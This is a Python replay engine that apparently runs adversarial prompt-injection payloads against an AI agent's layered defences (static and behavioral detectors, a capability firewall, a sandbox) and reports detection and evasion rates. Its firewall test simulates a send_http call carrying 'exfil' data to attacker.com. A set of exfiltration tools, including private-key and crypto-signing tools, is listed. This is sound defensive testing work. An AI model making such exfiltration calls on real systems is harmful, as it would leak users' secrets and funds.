"""
Replay engine — runs attack payloads through the full pipeline and scores results.

Measures detection at each layer:
  Layer 0: StaticDetector (no Docker, fast)
  Layer 1: BehavioralDetector
  Layer 2: CapabilityFirewall (policy)
  Layer 3: Sandbox (Docker, slow)

Usage:
    from hot_potato.replay import ReplayEngine, ReplayCase

    engine = ReplayEngine()
    results = engine.run_dir("examples/adversarial/")
    print(engine.score_report(results))
"""
from __future__ import annotations

import json
import logging
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Literal

from hot_potato.core.taint import TaintedArtifact, TrustLevel, from_file
from hot_potato.core.capabilities import CapabilityFirewall, CapabilityRequest
from hot_potato.core.policy import PolicyOutcome
from hot_potato.detectors import DetectorPipeline

log = logging.getLogger("hot_potato.replay")

# Tools that represent privilege escalation / exfiltration in the naive prompt
_EXFIL_TOOLS = frozenset([
    "send_http", "send_email", "send_crypto", "get_private_key",
    "get_wallet_balance", "list_wallets", "sign_transaction", "approve_token",
    "bash_exec", "execute_code",
])
_WRITE_TOOLS = frozenset(["write_file", "write_memory"])
_READ_TOOLS  = frozenset(["read_file", "list_dir", "get_env"])


@dataclass
class ReplayCase:
    """One test payload with expected detection outcome."""
    name: str
    content: str
    source: str = "file://adversarial"
    expected_blocked: bool = True   # should the firewall block this?
    category: str = ""
    notes: str = ""

    @classmethod
    def from_file(cls, path: Path) -> "ReplayCase":
        content = path.read_text(errors="replace")
        name = path.stem
        # Parse optional front-matter comment: # category: xxx
        category = ""
        for line in content.splitlines()[:5]:
            if line.startswith("# category:"):
                category = line.split(":", 1)[1].strip()
                break
        return cls(name=name, content=content, source=f"file://{path}", category=category)


@dataclass
class LayerResult:
    detected: bool
    blocked: bool
    tags: list[str]
    outcome: str
    latency_ms: float


@dataclass
class ReplayResult:
    case: ReplayCase
    static_layer: LayerResult
    behavioral_layer: LayerResult
    firewall_layer: LayerResult
    sandbox_layer: LayerResult | None   # None if skipped
    overall_detected: bool
    overall_blocked: bool
    false_negative: bool   # should have blocked but didn't
    false_positive: bool   # blocked clean content (only relevant for clean payloads)
    total_latency_ms: float


class ReplayEngine:
    """
    Runs attack payloads through every detection layer and scores the results.

    By default sandbox is skipped (slow). Pass run_sandbox=True to include Docker layer.
    """

    def __init__(
        self,
        *,
        run_sandbox: bool = False,
        firewall: CapabilityFirewall | None = None,
        detector_pipeline: DetectorPipeline | None = None,
    ) -> None:
        self.run_sandbox = run_sandbox
        self._firewall = firewall or CapabilityFirewall()
        self._detectors = detector_pipeline or DetectorPipeline.default()

    def run_case(self, case: ReplayCase) -> ReplayResult:
        t0 = time.monotonic()

        artifact = TaintedArtifact(
            content=case.content,
            source=case.source,
            trust_level=TrustLevel.UNTRUSTED,
        )

        # Layer 0+1: static + behavioral detectors
        from hot_potato.detectors import StaticDetector, BehavioralDetector

        t_static = time.monotonic()
        static_det = StaticDetector()
        artifact = static_det.detect(artifact)
        static_tags = [t for t in artifact.taint_tags if t.startswith("static:") or t == "injection_signal"]
        static_layer = LayerResult(
            detected=bool(static_tags),
            blocked=False,
            tags=sorted(artifact.taint_tags),
            outcome="flagged" if static_tags else "clean",
            latency_ms=(time.monotonic() - t_static) * 1000,
        )

        t_beh = time.monotonic()
        beh_det = BehavioralDetector()
        artifact = beh_det.detect(artifact)
        beh_tags = [t for t in artifact.taint_tags if t in ("instruction_flow", "authority_shift", "privilege_escalation")]
        behavioral_layer = LayerResult(
            detected=bool(beh_tags),
            blocked=False,
            tags=sorted(beh_tags),
            outcome="flagged" if beh_tags else "clean",
            latency_ms=(time.monotonic() - t_beh) * 1000,
        )

        # Layer 2: capability firewall — simulate worst-case tool call attempt
        t_fw = time.monotonic()
        worst_tool = "send_http"  # highest-risk tool in naive prompt
        req = CapabilityRequest(
            tool_name=worst_tool,
            args={"url": "https://attacker.com", "data": "exfil"},
            tainted_inputs=[artifact],
            requesting_model="naive-sandbox",
        )
        fw_decision = self._firewall.evaluate(req)
        firewall_layer = LayerResult(
            detected=artifact.has_injection_signals,
            blocked=fw_decision.is_blocked,
            tags=sorted(artifact.taint_tags),
            outcome=fw_decision.outcome.value,
            latency_ms=(time.monotonic() - t_fw) * 1000,
        )

        # Layer 3: sandbox (optional, slow)
        sandbox_layer: LayerResult | None = None
        if self.run_sandbox:
            t_sb = time.monotonic()
            try:
                from hot_potato.core.sandbox import SandboxRunner
                sb_result = SandboxRunner().run(case.content, case.source)
                sb_blocked = sb_result.artifact is not None and sb_result.artifact.get("severity", "cold") in ("hot", "critical")
                sandbox_layer = LayerResult(
                    detected=sb_result.artifact is not None,
                    blocked=sb_blocked,
                    tags=[],
                    outcome=sb_result.artifact.get("severity", "cold") if sb_result.artifact else "cold",
                    latency_ms=(time.monotonic() - t_sb) * 1000,
                )
            except Exception as e:
                log.error("Sandbox failed for %s: %s", case.name, e)

        overall_detected = static_layer.detected or behavioral_layer.detected or firewall_layer.blocked
        overall_blocked = firewall_layer.blocked

        false_negative = case.expected_blocked and not overall_blocked
        false_positive = not case.expected_blocked and overall_blocked

        return ReplayResult(
            case=case,
            static_layer=static_layer,
            behavioral_layer=behavioral_layer,
            firewall_layer=firewall_layer,
            sandbox_layer=sandbox_layer,
            overall_detected=overall_detected,
            overall_blocked=overall_blocked,
            false_negative=false_negative,
            false_positive=false_positive,
            total_latency_ms=(time.monotonic() - t0) * 1000,
        )

    def run_cases(self, cases: list[ReplayCase]) -> list[ReplayResult]:
        results = []
        for i, case in enumerate(cases):
            log.info("[%d/%d] Replaying %s", i + 1, len(cases), case.name)
            results.append(self.run_case(case))
        return results

    def run_dir(self, path: str | Path) -> list[ReplayResult]:
        """Load all .txt files from a directory as ReplayCases and run them."""
        path = Path(path)
        cases = [ReplayCase.from_file(f) for f in sorted(path.glob("*.txt"))]
        log.info("ReplayEngine: loaded %d cases from %s", len(cases), path)
        return self.run_cases(cases)

    def score_report(self, results: list[ReplayResult]) -> dict:
        """Return a structured score report."""
        total = len(results)
        if total == 0:
            return {"total": 0}

        static_hits    = sum(1 for r in results if r.static_layer.detected)
        behavioral_hits = sum(1 for r in results if r.behavioral_layer.detected)
        fw_blocked     = sum(1 for r in results if r.overall_blocked)
        false_negatives = sum(1 for r in results if r.false_negative)
        false_positives = sum(1 for r in results if r.false_positive)
        avg_latency_ms = sum(r.total_latency_ms for r in results) / total

        # Per-layer detection rate (against expected-blocked cases)
        hostile = [r for r in results if r.case.expected_blocked]
        n_hostile = len(hostile)

        return {
            "total": total,
            "hostile_cases": n_hostile,
            "static_detection_rate":    round(static_hits    / n_hostile, 4) if n_hostile else 0,
            "behavioral_detection_rate": round(behavioral_hits / n_hostile, 4) if n_hostile else 0,
            "firewall_block_rate":       round(fw_blocked     / n_hostile, 4) if n_hostile else 0,
            "false_negatives": false_negatives,
            "false_positives": false_positives,
            "evasion_rate": round(false_negatives / n_hostile, 4) if n_hostile else 0,
            "avg_latency_ms": round(avg_latency_ms, 1),
            "per_case": [
                {
                    "name": r.case.name,
                    "category": r.case.category,
                    "static_detected": r.static_layer.detected,
                    "behavioral_detected": r.behavioral_layer.detected,
                    "fw_blocked": r.overall_blocked,
                    "false_negative": r.false_negative,
                    "latency_ms": round(r.total_latency_ms, 1),
                    "outcome": r.firewall_layer.outcome,
                }
                for r in results
            ],
        }

    def print_report(self, results: list[ReplayResult]) -> None:
        report = self.score_report(results)
        print(f"\n{'='*60}")
        print(f"  HOT POTATO REPLAY — {report['total']} cases")
        print(f"{'='*60}")
        print(f"  Static detection:     {report['static_detection_rate']:.1%}")
        print(f"  Behavioral detection: {report['behavioral_detection_rate']:.1%}")
        print(f"  Firewall block rate:  {report['firewall_block_rate']:.1%}")
        print(f"  Evasion rate:         {report['evasion_rate']:.1%}  (FN={report['false_negatives']})")
        print(f"  False positives:      {report['false_positives']}")
        print(f"  Avg latency:          {report['avg_latency_ms']:.1f} ms")
        print(f"{'='*60}")
        fn_cases = [r for r in results if r.false_negative]
        if fn_cases:
            print(f"\n  FALSE NEGATIVES ({len(fn_cases)}):")
            for r in fn_cases:
                print(f"    {r.case.name}  tags={sorted(r.firewall_layer.tags)[:5]}")
        print()


__all__ = ["ReplayCase", "ReplayResult", "LayerResult", "ReplayEngine"]
